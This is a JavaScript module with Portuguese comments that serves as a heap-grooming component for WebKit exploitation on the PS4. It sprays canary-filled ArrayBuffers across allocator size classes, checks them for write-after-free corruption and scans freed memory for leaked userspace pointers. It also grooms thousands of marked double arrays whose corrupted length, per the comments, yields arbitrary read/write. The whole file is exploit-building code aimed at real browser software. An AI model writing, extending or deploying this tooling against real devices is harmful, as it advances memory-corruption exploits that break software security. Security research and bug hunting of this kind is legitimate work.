/**
 * MOD_MUTATOR.JS — Heap Groomer para detecção de UAF e OOB
 *
 * Módulo responsável por controlar o layout do heap e preparar "vítimas"
 * para detetar corrupções silenciosas de memória no WebKit.
 */

export const Mutator = {

    CANARY_A: 0x41, // 'A' — spray antes do free
    CANARY_B: 0x42, // 'B' — spray depois do free

    // Classes de tamanho do IsoHeap/bmalloc do WebKit no PS4
    SIZE_CLASSES: [32, 64, 128, 256, 512, 1024],

    /**
     * Aloca `count` ArrayBuffers de `size` bytes, todos preenchidos com `canary`.
     */
    spray: function(size, count, canary) {
        let slots = new Array(count);
        for (let i = 0; i < count; i++) {
            let buf = new ArrayBuffer(size);
            new Uint8Array(buf).fill(canary);
            slots[i] = buf;
        }
        return slots;
    },

    /**
     * Groom em todas as size classes simultaneamente.
     */
    groomAll: function(canary, countPerClass = 64) {
        let slots = [];
        for (let sz of this.SIZE_CLASSES) {
            let chunk = this.spray(sz, countPerClass, canary);
            slots.push(...chunk);
        }
        return slots;
    },

    /**
     * Verifica se algum slot ArrayBuffer foi corrompido (Write-After-Free).
     */
    checkCorruption: function(slots, expectedCanary) {
        for (let buf of slots) {
            try {
                let view = new Uint8Array(buf);
                for (let i = 0; i < Math.min(view.length, 32); i++) {
                    if (view[i] !== expectedCanary) {
                        return {
                            corrupted: true,
                            offset: i,
                            slotSize: buf.byteLength,
                            expected: expectedCanary,
                            found: view[i],
                            hex: `0x${view[i].toString(16).padStart(2, '0')}`
                        };
                    }
                }
            } catch(e) { /* slot pode ter sido detachado */ }
        }
        return { corrupted: false };
    },

    /**
     * Varre slots em busca de valores que pareçam ponteiros do PS4 userspace.
     */
    scanForPointers: function(slots) {
        const found = [];
        const LO = 0x0000100000000000n;
        const HI = 0x0000800000000000n;

        for (let buf of slots) {
            if (buf.byteLength < 8) continue;
            try {
                let view = new DataView(buf);
                for (let off = 0; off + 8 <= buf.byteLength; off += 8) {
                    let val = view.getBigUint64(off, true);
                    if (val > LO && val < HI) {
                        found.push({
                            offset: off,
                            slotSize: buf.byteLength,
                            val,
                            hex: '0x' + val.toString(16).padStart(16, '0')
                        });
                    }
                }
            } catch(e) {}
        }
        return found;
    },

    // ─── NOVA SECÇÃO: OOB Array Canaries ──────────────────────────────

    /**
     * Aloca milhares de arrays de doubles.
     * Se corrompermos o length de um destes no C++, ganhamos Arbitrary Read/Write.
     */
    groomOOB: function(count = 2000) {
        let victims = new Array(count);
        for (let i = 0; i < count; i++) {
            // Array de tamanho fixo 4
            let arr = [1.1, 2.2, 3.3, 4.4];
            arr.marker = 0x1337; // Assinatura para identificar o array na memória
            victims[i] = arr;
        }
        return victims;
    },

    /**
     * Varre as vítimas para ver se o limite do array foi corrompido
     * por um overflow (Ex: o bug do RegExp)
     */
    scanOOB: function(victims) {
        for (let i = 0; i < victims.length; i++) {
            let arr = victims[i];
            
            // O ALVO DE OURO: O tamanho do array mudou sem que o JS o tocasse?
            if (arr.length !== 4) {
                return {
                    corrupted: true,
                    type: 'LENGTH_CORRUPTION',
                    reason: `💥 OOB CONFIRMADO! O array canário [${i}] mudou o tamanho de 4 para ${arr.length}. Butterfly sobrescrito!`
                };
            }

            // O ALVO DE PRATA: O tamanho está igual, mas os dados internos foram sobrescritos?
            if (arr[0] !== 1.1 || arr[1] !== 2.2) {
                return {
                    corrupted: true,
                    type: 'DATA_OVERWRITE',
                    reason: `⚠️ OOB DATA WRITE! O conteúdo do array canário [${i}] foi corrompido silenciosamente.`
                };
            }
        }
        return { corrupted: false };
    }
};
